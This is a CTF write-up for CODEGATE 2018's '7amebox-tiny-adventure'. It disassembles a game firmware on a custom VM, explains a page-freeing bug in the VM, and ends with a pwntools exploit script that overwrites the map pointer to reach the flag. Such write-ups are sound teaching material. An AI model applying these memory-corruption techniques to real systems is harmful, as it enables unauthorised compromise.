---
layout: post
title: "[CODEGATE 2018] 7amebox-tiny-adventure"
comments: true
category: ctf
---

## before challenge

This challenge is also exec firmware like before. <br />
VM is same. <br />

***

## firmware

This is decompile results. <br />

```
[intro]
0x0000   11 1   12        3 sub sp, 0x3
0x0005    4 1    2        6 mov r2, 0x6
0x000a    4 0    1       12 mov r1, sp
0x000c    4 1    0        4 mov r0, 0x4
0x0011    8 0    0        0 syscall r0
0x0013    0 0   10        1 mov r10, [r1]
0x0015   30 1   13        4 call 0x1e <main>

[exit]
0x001a   21 0    0        0 xor r0, r0
0x001c    8 0    0        0 syscall r0

[main]
0x001e    6 0   11        0 push bp
0x0020    4 0   11       12 mov bp, sp
0x0022   11 1   12        6 sub sp, 0x6
0x0027    4 1    0     1762 mov r0, 0x6e2
0x002c   30 1   13     1652 call 0x6a5 <write>
0x0031   30 1   13      205 call 0x103 <loadmap>
0x0036   30 1   13      372 call 0x1af <checkHP>
0x003b   23 1    0        0 cmp r0, 0x0
0x0040   27 1   13      184 jz 0xf8
0x0045    4 1    0     2729 mov r0, 0xaa9
0x004a   30 1   13     1622 call 6a5 <write>
0x004f    4 0    5       11 mov r5, bp
0x0051   11 1    5        6 sub r5, 0x6
0x0056    2 0   15        5 mov [r5], zero
0x0058    4 1    1        3 mov r1, 0x3
0x005d    4 0    0        5 mov r0, r5
0x005f   30 1   13     1541 call 0x669 <read sys>
0x0064   21 0    6        6 xor r6, r6
0x0066    4 0    5       11 mov r5, bp
0x0068   11 1    5        6 sub r5, 0x6
0x006d    1 0    6        5 movb r6, [r5]
0x006f   24 1    6       49 cmpb r6, 0x31
0x0074   28 1   13       10 jnz 0x83
0x0079   30 1   13      360 call 0x1e6 <showCurrentMap>
0x007e   29 1   13      117 jmp f8
0x0083   24 1    6       50 cmpb r6, 0x32
0x0088   28 1   13       10 jnz 0x97
0x008d   30 1   13      458 call 0x25c <buyADog>
0x0092   29 1   13       97 jmp 0xf8
0x0097   24 1    6       51 cmpb r6, 0x33
0x009c   28 1   13       10 jnz 0xab
0x00a1   30 1   13      606 call 0x304 <sellADog>
0x00a6   29 1   13       77 jmp 0xf8
0x00ab   24 1    6       52 cmpb r6, 0x34
0x00b0   28 1   13       15 jnz 0xc4
0x00b5    4 1    0     2295 mov r0, 0x8f7
0x00ba   30 1   13     1510 call 0x6a5 <write>
0x00bf   29 1   13       52 jmp 0xf8
0x00c4   24 1    6      119 cmpb r6, 0x77
0x00c9   27 1   13       35 jz 0xf1
0x00ce   24 1    6       97 cmpb r6, 0x61
0x00d3   27 1   13       25 jz 0xf1
0x00d8   24 1    6      115 cmpb r6, 0x73
0x00dd   27 1   13       15 jz 0xf1
0x00e2   24 1    6      100 cmpb r6, 0x64
0x00e7   27 1   13        5 jz 0xf1
0x00ec   29 1   13        7 jmp 0xf8
0x00f1    4 0    0        6 mov r0, r6
0x00f3   30 1   13      651 call 0x383 <move>
0x00f8   29 1   13  2096953 jmp 0x36
0x00fd    4 0   12       11 mov sp, bp
0x00ff    7 0   11        0 pop bp
0x0101    7 0   13        0 pop pc

[load map] -> load stage.map to memory and return allocated memory's address
0x0103    6 0   11        0 push bp
0x0105    4 0   11       12 mov bp, sp
0x0107   11 1   12        6 sub sp, 0x6
0x010c    4 0    5       10 mov r5, r10
0x010e    2 0   15        5 mov [r5], zero
0x0110    4 0    5       10 mov r5, r10
0x0112    9 1    5        3 add r5, 0x3
0x0117    4 1    2      256 mov r2, 0x100
0x011c   15 1    2        3 mul r2, 0x3
0x0121    4 1    1        0 mov r1, 0x0
0x0126    4 0    0        5 mov r0, r5
0x0128   30 1   13     1262 call 0x61b
0x012d    4 0    5       10 mov r5, r10
0x012f    9 1    5      774 add r5, 0x306
0x0134    4 1    6        6 mov r6, 0x6
0x0139    2 0    6        5 mov [r5], r6
0x013b    4 0    5       10 mov r5, r10
0x013d    9 1    5      777 add r5, 0x309
0x0142    4 1    6      120 mov r6, 0x78
0x0147    2 0    6        5 mov [r5], r6
0x0149    4 0    5       10 mov r5, r10
0x014b    9 1    5      780 add r5, 0x30c
0x0150    4 1    6       97 mov r6, 0x61
0x0155    2 0    6        5 mov [r5], r6
0x0157    4 0    5       10 mov r5, r10
0x0159    9 1    5      783 add r5, 0x30f
0x015e    2 0   15        5 mov [r5], zero
0x0160    4 0    5       10 mov r5, r10
0x0162    9 1    5      786 add r5, 0x312
0x0167    2 0   15        5 mov [r5], zero
0x0169    4 1    2        6 mov r2, 0x6
0x016e    4 0    5       11 mov r5, bp
0x0170   11 1    5        6 sub r5, 0x6
0x0175    4 0    1        5 mov r1, r5
0x0177    4 1    0        4 mov r0, 0x4
0x017c    8 0    0        0 syscall r0
0x017e    0 0    7        1 mov r7, [r1]
0x0180    4 0    5       10 mov r5, r10
0x0182    9 1    5      771 add r5, 0x303
0x0187    2 0    7        5 mov [r5], r7
0x0189    4 1    5     3711 mov r5, 0xe7f
0x018e    4 0    1        5 mov r1, r5
0x0190    4 1    0        1 mov r0, 0x1
0x0195    8 0    0        0 syscall r0
0x0197    4 1    3     3600 mov r3, 0xe10
0x019c    4 0    2        7 mov r2, r7
0x019e    4 0    1        0 mov r1, r0
0x01a0    4 1    0        3 mov r0, 0x3
0x01a5    8 0    0        0 syscall r0
0x01a7    4 0    0        2 mov r0, r2
0x01a9    4 0   12       11 mov sp, bp
0x01ab    7 0   11        0 pop bp
0x01ad    7 0   13        0 pop pc

[checkHP] -> check HP and if it is lower than 1, print 'YOU WERE DEAD!'
0x01af    6 0   11        0 push bp
0x01b1    4 0   11       12 mov bp, sp
0x01b3   11 1   12        6 sub sp, 0x6
0x01b8   30 1   13     1013 call 0x5b2
0x01bd   23 1    0        0 cmp r0, 0x0
0x01c2   25 1   13       20 ja 0x1db
0x01c7    4 1    0     3174 mov r0, 0xc66
0x01cc   30 1   13     1236 call 0x6a5
0x01d1    4 1    0        0 mov r0, 0x0
0x01d6   29 1   13        5 jmp 0x1e0
0x01db    4 1    0        1 mov r0, 0x1
0x01e0    4 0   12       11 mov sp, bp
0x01e2    7 0   11        0 pop bp
0x01e4    7 0   13        0 pop pc

[showCurrentMap]
0x01e6    6 0   11        0 push bp
0x01e8    4 0   11       12 mov bp, sp
0x01ea   11 1   12        3 sub sp, 0x3
0x01ef    4 1    0     2501 mov r0, 0x9c5
0x01f4   30 1   13     1196 call 0x6a5 <write>
0x01f9    4 1    0     2924 mov r0, 0xb6c
0x01fe   30 1   13     1186 call 0x6a5 <write>
0x0203   30 1   13      925 call 0x5a5 <getMapAddr>
0x0208    4 0    7        0 mov r7, r0
0x020a   21 0    6        6 xor r6, r6
0x020c   23 1    6       60 cmp r6, 0x3c
0x0211   27 1   13       54 jz 0x24c
0x0216    4 1    1        1 mov r1, 0x1
0x021b    4 1    0     3040 mov r0, 0xbe0
0x0220   30 1   13     1122 call 0x687 <write syscall>
0x0225    4 1    1       60 mov r1, 0x3c
0x022a    4 0    0        7 mov r0, r7 
0x022c   30 1   13     1110 call 0x687 <write syscall>
0x0231    4 1    1        2 mov r1, 0x2
0x0236    4 1    0     3042 mov r0, 0xbe2
0x023b   30 1   13     1095 call 0x687 <write syscall>
0x0240    9 1    7       60 add r7, 0x3c
0x0245   17 0    6        0 inc r6
0x0247   29 1   13  2097088 jmp 0x20c
0x024c    4 1    0     2924 mov r0, 0xb6c
0x0251   30 1   13     1103 call 0x6a5 <write>
0x0256    4 0   12       11 mov sp, bp
0x0258    7 0   11        0 pop bp
0x025a    7 0   13        0 pop pc

[buyADog]
0x025c    6 0   11        0 push bp
0x025e    4 0   11       12 mov bp, sp
0x0260   11 1   12        6 sub sp, 0x6
0x0265    4 1    2        6 mov r2, 0x6
0x026a    4 0    5       11 mov r5, bp
0x026c   11 1    5        3 sub r5, 0x3
0x0271    4 0    1        5 mov r1, r5
0x0273    4 1    0        4 mov r0, 0x4
0x0278    8 0    0        0 syscall r0
0x027a   23 1    0        0 cmp r0, 0x0
0x027f   27 1   13      112 jz 0x2f4
0x0284    4 0    5       10 mov r5, r10
0x0286    0 0    6        5 mov r6, [r5]
0x0288   17 0    6        0 inc r6
0x028a    2 0    6        5 mov [r5], r6
0x028c   15 1    6        3 mul r6, 0x3
0x0291    9 0    6       10 add r6, r10
0x0293    4 0    5       11 mov r5, bp
0x0295   11 1    5        3 sub r5, 0x3
0x029a    0 0    5        5 mov r5, [r5]
0x029c    2 0    5        6 mov [r6], r5
0x029e    4 1    0     3047 mov r0, 0xbe7
0x02a3   30 1   13     1021 call 0x6a5 <write>
0x02a8    4 1    1        3 mov r1, 0x3
0x02ad    4 0    5       11 mov r5, bp
0x02af   11 1    5        6 sub r5, 0x6
0x02b4    4 0    0        5 mov r0, r5
0x02b6   30 1   13      942 call 0x669 <read syscall>
0x02bb    4 0    5       11 mov r5, bp
0x02bd   11 1    5        6 sub r5, 0x6
0x02c2   21 0    6        6 xor r6, r6
0x02c4    1 0    6        5 movb r6, [r5]
0x02c6   24 1    6      121 cmpb r6, 0x79
0x02cb   28 1   13       21 jnz 0x2e5
0x02d0    4 1    1     4096 mov r1, 0x1000
0x02d5    4 0    5       11 mov r5, bp
0x02d7   11 1    5        3 sub r5, 0x3
0x02dc    0 0    6        5 mov r6, [r5]
0x02de    4 0    0        6 mov r0, r6
0x02e0   30 1   13      900 call 0x669 <read syscall>
0x02e5    4 1    0     3096 mov r0, 0xc18
0x02ea   30 1   13      950 call 0x6a5
0x02ef   29 1   13       10 jmp 0x2fe
0x02f4    4 1    0     3141 mov r0, 0xc45
0x02f9   30 1   13      935 call 0x6a5
0x02fe    4 0   12       11 mov sp, bp
0x0300    7 0   11        0 pop bp
0x0302    7 0   13        0 pop pc

[sellADog]
0x0304    6 0   11        0 push bp
0x0306    4 0   11       12 mov bp, sp
0x0308   11 1   12        6 sub sp, 0x6
0x030d    4 0    5       10 mov r5, r10
0x030f    9 1    5      774 add r5, 0x306
0x0314    0 0    6        5 mov r6, [r5]
0x0316   23 1    6        0 cmp r6, 0x0
0x031b   27 1   13       83 jz 0x373
0x0320   18 0    6        0 dec r6
0x0322    2 0    6        5 mov [r5], r6
0x0324    4 1    0     2988 mov r0, 0xbac
0x0329   30 1   13      887 call 0x6a5 <write>
0x032e    4 1    1        4 mov r1, 0x4
0x0333    4 0    5       11 mov r5, bp
0x0335   11 1    5        6 sub r5, 0x6
0x033a    4 0    0        5 mov r0, r5
0x033c   30 1   13      808 call 0x669 <read sys>
0x0341    4 0    5       11 mov r5, bp
0x0343   11 1    5        6 sub r5, 0x6
0x0348    0 0    6        5 mov r6, [r5]
0x034a   23 1    6  1048576 cmp r6, 0x100000
0x034f   26 1   13       31 jb 0x373
0x0354    4 0    5       11 mov r5, bp
0x0356   11 1    5        6 sub r5, 0x6
0x035b    0 0    1        5 mov r1, [r5]
0x035d    4 1    0        6 mov r0, 0x6
0x0362    8 0    0        0 syscall r0
0x0364    4 1    0     3021 mov r0, 0xbcd
0x0369   30 1   13      823 call 0x6a5
0x036e   29 1   13       10 jmp 0x37d
0x0373    4 1    0     3116 mov r0, 0xc2c
0x0378   30 1   13      808 call 0x6a5
0x037d    4 0   12       11 mov sp, bp
0x037f    7 0   11        0 pop bp
0x0381    7 0   13        0 pop pc

[move]
0x0383    6 0   11        0 push bp
0x0385    4 0   11       12 mov bp, sp
0x0387   11 1   12       12 sub sp, 0xc
0x038c    4 0    5       11 mov r5, bp
0x038e   11 1    5        3 sub r5, 0x3
0x0393    3 0    0        5 movb [r5], r0
0x0395   30 1   13      523 call 0x5a5 <getMapAddr>
0x039a    4 0    5       11 mov r5, bp
0x039c   11 1    5        9 sub r5, 0x9
0x03a1    2 0    0        5 mov [r5], r0
0x03a3    4 0    5       10 mov r5, r10
0x03a5    9 1    5      783 add r5, 0x30f
0x03aa    0 0    8        5 mov r8, [r5]
0x03ac    4 0    5       10 mov r5, r10
0x03ae    9 1    5      786 add r5, 0x312
0x03b3    0 0    9        5 mov r9, [r5]
0x03b5    4 0    5        0 mov r5, r0
0x03b7    4 0    6        9 mov r6, r9
0x03b9   15 1    6       60 mul r6, 0x3c
0x03be    9 0    5        6 add r5, r6
0x03c0    9 0    5        8 add r5, r8
0x03c2   21 0    6        6 xor r6, r6
0x03c4    1 0    6        5 movb r6, [r5]
0x03c6   24 1    6       64 cmpb r6, 0x40
0x03cb   28 1   13        7 jnz 0x3d7
0x03d0    4 1    6       32 mov r6, 0x20
0x03d5    3 0    6        5 movb [r5], r6
0x03d7   21 0    6        6 xor r6, r6
0x03d9    4 0    5       11 mov r5, bp
0x03db   11 1    5        3 sub r5, 0x3
0x03e0    1 0    6        5 movb r6, [r5]
0x03e2   24 1    6      119 cmpb r6, 0x77
0x03e7   28 1   13       12 jnz 0x3f8
0x03ec   18 0    9        0 dec r9
0x03ee   22 1    9       60 mod r9, 0x3c
0x03f3   29 1   13       51 jmp 0x42b
0x03f8   24 1    6       97 cmpb r6, 0x61
0x03fd   28 1   13       12 jnz 0x40e
0x0402   18 0    8        0 dec r8
0x0404   22 1    8       60 mod r8, 0x3c
0x0409   29 1   13       29 jmp 0x42b
0x040e   24 1    6      115 cmpb r6, 0x73
0x0413   28 1   13       12 jnz 0x424
0x0418   17 0    9        0 inc r9
0x041a   22 1    9       60 mod r9, 0x3c
0x041f   29 1   13        7 jmp 0x42b
0x0424   17 0    8        0 inc r8
0x0426   22 1    8       60 mod r8, 0x3c
0x042b    4 0    5       10 mov r5, r10
0x042d    9 1    5      783 add r5, 0x30f
0x0432    2 0    8        5 mov [r5], r8
0x0434    4 0    5       10 mov r5, r10
0x0436    9 1    5      786 add r5, 0x312
0x043b    2 0    9        5 mov [r5], r9
0x043d    4 0    5       11 mov r5, bp
0x043f   11 1    5        9 sub r5, 0x9
0x0444    0 0    5        5 mov r5, [r5]
0x0446    4 0    6        9 mov r6, r9
0x0448   15 1    6       60 mul r6, 0x3c
0x044d    9 0    5        6 add r5, r6
0x044f    9 0    5        8 add r5, r8
0x0451    4 0    6       11 mov r6, bp
0x0453   11 1    6       12 sub r6, 0xc
0x0458    2 0    5        6 mov [r6], r5
0x045a   21 0    6        6 xor r6, r6
0x045c    1 0    6        5 movb r6, [r5]
0x045e    4 1    7       64 mov r7, 0x40
0x0463    3 0    7        5 movb [r5], r7
0x0465   24 1    6       32 cmpb r6, 0x20
0x046a   27 1   13      304 jz 0x59f
0x046f   24 1    6       42 cmpb r6, 0x2a
0x0474   27 1   13      140 jz 0x505
0x0479   24 1    6      122 cmpb r6, 0x7a
0x047e   27 1   13      177 jz 0x534
0x0483   24 1    6       97 cmpb r6, 0x61
0x0488   26 1   13      274 jb 0x59f
0x048d   24 1    6      122 cmpb r6, 0x7a
0x0492   25 1   13      264 ja 0x59f
0x0497    4 1    0     2823 mov r0, 0xb07
0x049c   30 1   13      516 call 0x6a5
0x04a1    4 1    1        3 mov r1, 0x3
0x04a6    4 0    5       11 mov r5, bp
0x04a8   11 1    5        6 sub r5, 0x6
0x04ad    4 0    0        5 mov r0, r5
0x04af   30 1   13      437 call 0x669
0x04b4    4 0    5       10 mov r5, r10
0x04b6    9 1    5      777 add r5, 0x309
0x04bb    0 0    7        5 mov r7, [r5]
0x04bd   23 1    7       30 cmp r7, 0x1e
0x04c2   26 1   13       12 jb 0x4d3
0x04c7   11 1    7       30 sub r7, 0x1e
0x04cc    2 0    7        5 mov [r5], r7
0x04ce   29 1   13        2 jmp 0x4d5
0x04d3    2 0   15        5 mov [r5], zero
0x04d5    4 0    5       10 mov r5, r10
0x04d7    9 1    5      780 add r5, 0x30c
0x04dc    0 0    7        5 mov r7, [r5]
0x04de   23 0    6        7 cmp r6, r7
0x04e0   25 1   13       16 ja 0x4f5
0x04e5    4 0    5       11 mov r5, bp
0x04e7   11 1    5       12 sub r5, 0xc
0x04ec    0 0    8        5 mov r8, [r5]
0x04ee    4 1    6       42 mov r6, 0x2a
0x04f3    3 0    6        8 movb [r8], r6
0x04f5    4 0    5       11 mov r5, bp
0x04f7   11 1    5       12 sub r5, 0xc
0x04fc    0 0    8        5 mov r8, [r5]
0x04fe    3 0    6        8 movb [r8], r6
0x0500   29 1   13      154 jmp 0x59f
0x0505    4 0    5       10 mov r5, r10
0x0507    9 1    5      777 add r5, 0x309
0x050c    0 0    7        5 mov r7, [r5]
0x050e    9 1    7       40 add r7, 0x28
0x0513    2 0    7        5 mov [r5], r7
0x0515    4 0    5       10 mov r5, r10
0x0517    9 1    5      780 add r5, 0x30c
0x051c    0 0    7        5 mov r7, [r5]
0x051e    9 1    7        5 add r7, 0x5
0x0523    2 0    7        5 mov [r5], r7
0x0525    4 1    0     2913 mov r0, 0xb61
0x052a   30 1   13      374 call 0x6a5
0x052f   29 1   13      107 jmp 0x59f
0x0534    4 1    0     2863 mov r0, 0xb2f
0x0539   30 1   13      359 call 0x6a5
0x053e    4 1    1        3 mov r1, 0x3
0x0543    4 0    5       11 mov r5, bp
0x0545   11 1    5        6 sub r5, 0x6
0x054a    4 0    0        5 mov r0, r5
0x054c   30 1   13      280 call 0x669
0x0551    4 0    5       10 mov r5, r10
0x0553    9 1    5      777 add r5, 0x309
0x0558    0 0    7        5 mov r7, [r5]
0x055a   23 1    7     2000 cmp r7, 0x7d0
0x055f   26 1   13       12 jb 0x570
0x0564   11 1    7     2000 sub r7, 0x7d0
0x0569    2 0    7        5 mov [r5], r7
0x056b   29 1   13        2 jmp 0x572
0x0570    2 0   15        5 mov [r5], zero
0x0572    4 0    5       10 mov r5, r10
0x0574    9 1    5      780 add r5, 0x30c
0x0579    0 0    7        5 mov r7, [r5]
0x057b   23 1    7      700 cmp r7, 0x2bc
0x0580   26 1   13       10 jb 0x58f
0x0585   30 1   13       53 call 0x5bf <killBoss>
0x058a   29 1   13       16 jmp 0x59f
0x058f    4 0    5       11 mov r5, bp
0x0591   11 1    5       12 sub r5, 0xc
0x0596    0 0    8        5 mov r8, [r5]
0x0598    3 0    6        8 movb [r8], r6
0x059a   29 1   13        0 jmp 0x59f
0x059f    4 0   12       11 mov sp, bp
0x05a1    7 0   11        0 pop bp
0x05a3    7 0   13        0 pop pc

[getMapAddr]
0x05a5    4 0    5       10 mov r5, r10
0x05a7    9 1    5      771 add r5, 0x303
0x05ac    0 0    6        5 mov r6, [r5]
0x05ae    4 0    0        6 mov r0, r6
0x05b0    7 0   13        0 pop pc

[getHP] -> return [0x1309] value
0x05b2    4 0    5       10 mov r5, r10
0x05b4    9 1    5      777 add r5, 0x309
0x05b9    0 0    6        5 mov r6, [r5]
0x05bb    4 0    0        6 mov r0, r6
0x05bd    7 0   13        0 pop pc

[killBoss]
0x05bf    6 0   11        0 push bp
0x05c1    4 0   11       12 mov bp, sp
0x05c3   11 1   12       60 sub sp, 0x3c
0x05c8    4 1    2       60 mov r2, 0x3c
0x05cd    4 1    1        0 mov r1, 0x0
0x05d2    4 0    5       11 mov r5, bp
0x05d4   11 1    5       60 sub r5, 0x3c
0x05d9    4 0    0        5 mov r0, r5
0x05db   30 1   13       59 call 0x61b <memset>
0x05e0    4 1    1     3706 mov r1, 0xe7a
0x05e5    4 1    0        1 mov r0, 0x1
0x05ea    8 0    0        0 syscall r0
0x05ec    4 1    3       60 mov r3, 0x3c
0x05f1    4 0    5       11 mov r5, bp
0x05f3   11 1    5       60 sub r5, 0x3c
0x05f8    4 0    2        5 mov r2, r5
0x05fa    4 0    1        0 mov r1, r0
0x05fc    4 1    0        3 mov r0, 0x3
0x0601    8 0    0        0 syscall r0
0x0603    4 0    5       11 mov r5, bp
0x0605   11 1    5       60 sub r5, 0x3c
0x060a    4 0    0        5 mov r0, r5
0x060c   30 1   13      148 call 0x6a5
0x0611   21 0    0        0 xor r0, r0
0x0613    8 0    0        0 syscall r0
0x0615    4 0   12       11 mov sp, bp
0x0617    7 0   11        0 pop bp
0x0619    7 0   13        0 pop pc

[memset] -> from r0, size=r2, value=r1
0x061b    6 0    0        0 push r0
0x061d    6 0    1        0 push r1
0x061f    6 0    2        0 push r2
0x0621   23 1    2        0 cmp r2, 0x0
0x0626   27 1   13       11 jz 0x636
0x062b    3 0    1        0 movb [r0], r1
0x062d   17 0    0        0 inc r0
0x062f   18 0    2        0 dec r2
0x0631   29 1   13  2097131 jmp 0x621
0x0636    7 0    2        0 pop r2
0x0638    7 0    1        0 pop r1
0x063a    7 0    0        0 pop r0
0x063c    7 0   13        0 pop pc

0x063e    6 0    0        0 push r0
0x0640    6 0    1        0 push r1
0x0642    6 0    2        0 push r2
0x0644    6 0    3        0 push r3
0x0646   23 1    2        0 cmp r2, 0x0
0x064b   27 1   13       15 jz 0x65f
0x0650    1 0    3        1 movb r3, [r1]
0x0652    3 0    3        0 movb [r0], r3
0x0654   17 0    0        0 inc r0
0x0656   17 0    1        0 inc r1
0x0658   18 0    2        0 dec r2
0x065a   29 1   13  2097127 jmp 0x646
0x065f    7 0    3        0 pop r3
0x0661    7 0    2        0 pop r2
0x0663    7 0    1        0 pop r1
0x0665    7 0    0        0 pop r0
0x0667    7 0   13        0 pop pc

[read syscall]
0x0669    6 0    1        0 push r1
0x066b    6 0    2        0 push r2
0x066d    6 0    3        0 push r3
0x066f    4 0    3        1 mov r3, r1
0x0671    4 0    2        0 mov r2, r0
0x0673    4 1    1        0 mov r1, 0x0
0x0678    4 1    0        3 mov r0, 0x3
0x067d    8 0    0        0 syscall r0
0x067f    7 0    3        0 pop r3
0x0681    7 0    2        0 pop r2
0x0683    7 0    1        0 pop r1
0x0685    7 0   13        0 pop pc

[write syscall]
0x0687    6 0    1        0 push r1
0x0689    6 0    2        0 push r2
0x068b    6 0    3        0 push r3
0x068d    4 0    3        1 mov r3, r1
0x068f    4 0    2        0 mov r2, r0
0x0691    4 1    1        1 mov r1, 0x1
0x0696    4 1    0        2 mov r0, 0x2
0x069b    8 0    0        0 syscall r0
0x069d    7 0    3        0 pop r3
0x069f    7 0    2        0 pop r2
0x06a1    7 0    1        0 pop r1
0x06a3    7 0   13        0 pop pc

[write]
0x06a5    6 0    0        0 push r0
0x06a7    6 0    1        0 push r1
0x06a9    4 0    1        0 mov r1, r0
0x06ab   30 1   13       13 call 0x6bd
0x06b0    5 0    0        1 xchg r0, r1
0x06b2   30 1   13  2097104 call 0x687
0x06b7    7 0    1        0 pop r1
0x06b9    7 0    0        0 pop r0
0x06bb    7 0   13        0 pop pc

[find \x00 for strlen]
0x06bd    6 0    1        0 push r1
0x06bf    6 0    2        0 push r2
0x06c1   21 0    1        1 xor r1, r1
0x06c3   21 0    2        2 xor r2, r2
0x06c5    1 0    2        0 movb r2, [r0]
0x06c7   24 1    2        0 cmpb r2, 0x0
0x06cc   27 1   13        9 jz 0x6da
0x06d1   17 0    0        0 inc r0
0x06d3   17 0    1        0 inc r1
0x06d5   29 1   13  2097131 jmp 0x6c5
0x06da    4 0    0        1 mov r0, r1
0x06dc    7 0    2        0 pop r2
0x06de    7 0    1        0 pop r1
0x06e0    7 0   13        0 pop pc

[.data]
0x06e2
====================================================
|                PWN ADVENTURE V8.6                |
====================================================
|               __                                 |
|             _|^ |________                        |
|            (____|        |___                    |
|                 |________|                       |
|                  | |   | |                       |
|                                                  |
----------------------------------------------------

0xaa9
1) show current map
2) buy a dog
3) sell a dog
4) direction help
w a s d) move to direction

0x9c5
-------------------------------------------------
* (\x2a)      = power up
# (\x23)      = wall
@ (\x40)      = you
a ~ y         = monster
z             = boss monster (flag)
-------------------------------------------------


0x8f7

   direction
    ________________________________ 
   |          W : north             |
   | A : west             D : east  |
   |          S : south             |
   |________________________________|
    
0xb6c
##############################################################

0xbe0
#
    
0xbe2
#\x0a

0xbe7
do you want to draw a avatar of the dog? (y/n)

0xc45
you already have too many dogs!
    
0xc66
YOU WERE DEAD!

0xe7f
stage.map


```

This is game and it prints flag if we kill boss monster. <br />
We can move character left, right, up and down. There's system of dog, we can buy or sell it. <br />
If we kill monster, it gives '*', and get power. <br />
If our power is over 0x2bc(700), then we can kill boss monster. <br />
If we can make our power over 0x2bc, we can get flag. <br />
<br />
When game starts, there are six dog. <br />
If we buy dog, increase r10(dog's cnt), alloc memory and put address to dog arrangement. <br />
After alloc 0x100 pages, then we can overwrite r10+0x303. <br />
But our vm's memory size is (2 ** 20). It is 0x100000. <br />
So maximum number of pages is 256.<br />
If we want to sell dog, we have to send input as address of page. <br />
But there's conditional statement. <br />
Input address is over 0x100000. But maximum memory address is 0x100000, so we can't free any memory. <br />

***

## VM

Vulnerabilities also exist in VMs. <br />
At sys_6 and set_perm, page is freed withdout checking wheter it exists in the page key list. <br />
This process makes add key to pages. <br />
When first starting game, we have 6 dogs, so we can add 6 pages more. <br />
<br />
Also, this firmware is run in python2 environment. <br />
There are differences in list key based on version 3.7 of python. <br />
Before 3.7, it is sorted by hash. <br />
So if we add 6 pages, and after that buy 256 dog, last dog's page isn't over 0x100000. <br />

***

## Ex flow

1. sell 6 dog. Number of pages will be 261 and 5page is already used. <br />
2. Buy 256 dog. When buy last dog, we have to input dog's avatar. <br />
3. Last dog overwrites r10+0x303, and this is map address. <br />
4. By input avatar of dog, we can reconstruction map. <br />
5. Add lots of '*' to map. We can increase power over 700 by eat it. <br />
6. Beat the boss moster. <br />

***

## Ex code
```python
from pwn import *

#context.log_level = 'debug'

def int_to_bytes(n):
    return n.to_bytes((n.bit_length() + 7) // 8, byteorder='big')[1:]

def write_memory(data):
    res = 0
    res |= (data & 0b1111111) << 16
    res |= (data & 0b11111110000000) >> 7
    res |= (data & 0b111111100000000000000) >> 6
    res |= 0b1 << 24
    return res

r = remote('192.168.0.2', 8103)

def sell_dog(addr):
    r.sendlineafter(b'>', b'3')
    r.sendlineafter(b'>', int_to_bytes(write_memory(addr)))

def buy_dog():
    r.sendlineafter(b'>',b'2')
    r.sendlineafter(b'>',b'n')

def move_left():
    r.sendlineafter(b'>', b'a')

def move_right():
    r.sendlineafter(b'>', b'd')

def move_down():
    r.sendlineafter(b'>', b's')

sell_dog(0x100000)
sell_dog(0x101000)
sell_dog(0x102000)
sell_dog(0x103000)
sell_dog(0x104000)
sell_dog(0x105000)

for i in range(256):
    buy_dog()

r.sendlineafter(b'>', b'2')
r.sendlineafter(b'>', b'y')
r.sendline(b'*' * (0x3c * 0x3c - 1) + b'z')

for i in range(0x3c - 1):
    for i in range(0x3c):
        move_right()

    move_down()

for i in range(0x3c - 1):
    move_right()

r.sendlineafter(b'>', b'1')

r.interactive()
```